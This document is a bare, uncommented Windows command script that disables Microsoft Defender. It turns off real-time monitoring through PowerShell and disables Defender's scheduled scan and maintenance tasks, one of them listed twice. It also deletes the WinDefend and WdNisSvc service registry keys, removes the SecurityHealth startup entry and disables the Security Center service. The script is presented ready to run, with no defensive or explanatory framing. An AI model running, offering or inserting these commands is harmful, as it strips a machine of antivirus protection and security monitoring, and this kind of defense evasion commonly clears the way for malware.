powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"


schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /disable
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /disable
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable

reg DELETE "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /f
reg DELETE "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
reg DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v SecurityHealth
reg ADD "HKLM\SYSTEM\CurrentControlSet\Services\wscsvc" /f /v "Start" /t REG_DWORD /d 4

